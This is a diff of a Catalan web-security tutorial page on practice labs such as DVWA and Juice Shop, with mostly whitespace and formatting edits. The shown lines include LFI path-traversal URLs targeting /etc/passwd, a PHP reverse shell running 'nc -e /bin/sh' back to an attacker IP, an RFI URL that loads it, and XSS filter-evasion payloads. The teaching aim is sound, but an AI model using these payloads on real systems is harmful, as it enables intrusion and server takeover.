@@ -225,10 +225,10 @@
         <p>Per començar, les més utilitzades son "dvwa" i "juice-shop"</p>
         <li>apt install dvwa </li>
         <pre><code># dvwa-start 
-          # dvwa-stop    </code></pre>
+# dvwa-stop    </code></pre>
         <li>apt install juice-shop </li>
         <pre><code># juice-shop-start 
-          # juice-shop-stop    </code></pre>
+# juice-shop-stop    </code></pre>
         <p>En TyHackMe també estan les màquines</p>  
         <p>En PentesterLab també</p>
         <p>En Academia de Seguridad Web de PortSwigger  també</p>
@@ -258,12 +258,12 @@
         <code>https://exemple.com/pagina.php?lang=cat</code>
         <p>En este cas el paràmetre  lang=cat, es podria intentar manipular....</p>
         <pre><code>https://exemple.com/pagina.php?lang=../../../../etc/passwd
-        https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
+https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
         <p>Si el servidor és vulnerable, el codi intentaria incloure el contingut de l'arxiu /etc/passwd 
           (un arxiu de Linux que conté informació d'usuaris), i el contingut d'aquest arxiu es mostraria 
           a la pàgina web, exposant informació sensible</p>
 
-        <p>En la màquina DVWA, es proposa la URL ..</p>
+        <p>==> En la màquina DVWA, es proposa la URL ..</p>
         <code>/dvwa/vulnerabilities/fi/?page=file1.php</code>
         <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
         <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
@@ -317,21 +317,21 @@
           <code>$ nc -lnvp 4444</code>
           <li>A més a més , l'atacant obri un server web simple per servir fitxers de comandos</li>
           <pre><code>
-           mkdir /tmp/files
-           cd /tmp/files
-           python3 -m http.server 80 
+mkdir /tmp/files
+cd /tmp/files
+python3 -m http.server 80 
           </code></pre>
           <li>Es posa un fitxer 'reverse.txt' amb</li>
           <pre><code>
-            &lt;?php
-               passthru("nc -e /bin/sh 10.0.10.40 4444");
-            ?>
+&lt;?php
+    passthru("nc -e /bin/sh 10.0.10.40 4444");
+?>
           </code></pre>
 
           <p>Ara, per executar la reverse shell..</p>
           <pre><code>
-            en el navegador , posem la ip de la victima seguit del codi RFI  
-            10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
+en el navegador , posem la ip de la victima seguit del codi RFI  
+10.0.10.50/dvwa/vulnerabilities/fi/?page=http://10.0.10.40/reverse.txt
           </code></pre>
           
    
@@ -503,7 +503,7 @@
           En aquest cas, la vulnerabilitat es troba al costat del client, al codi JavaScript de la pàgina, no al servidor.
         </ol>
         <h4>XSS reflectit (Reflected XSS)</h4>
-        <img src="imgs/xss-r-attack.png" alt="r-xss" width="70%" class="imatge-dreta" >   
+        <img src="imgs/xss-r-attack.png" alt="r-xss" width="50%" class="imatge-dreta" >   
         <p>Com funciona? L'atacant crea un enllaç maliciós amb el codi maliciós injectat. Normalment es fa arribar a la victima amb Enginyeria Social.
           Quan un usuari(victima) fa clic a l'enllaç, la petició 
           s'envia al servidor, que la processa i inclou el codi a la resposta HTML. El navegador de l'usuari executa el codi maliciós
@@ -514,7 +514,7 @@
          <p>També se sol utilitzar la funcio <code>alert(1)</code> per testar XSS</p>
             <h5>Evasió</h5>
             <p>Per evitar ser detectat per les possibles funcions que netegen el codi, es poden utilitzar algunes tècniques..</p>
-            <li>En BurpSuit hi ha una opcion per Codificar en hexadecimal (encode as ..url) </li>
+            <li>En <strong>BurpSuit</strong> hi ha una opció per Codificar en hexadecimal (encode as ..url) </li>
             <li>També es pot barrejar majúscules <code>=&lt;sCript>alert(1);&lt;/sCript></code> </li>
             <li>Usar altres etiquetes html combinades amb events.. <code> &lt;img src=1 onerror=alert(1)>  </code></li>
         
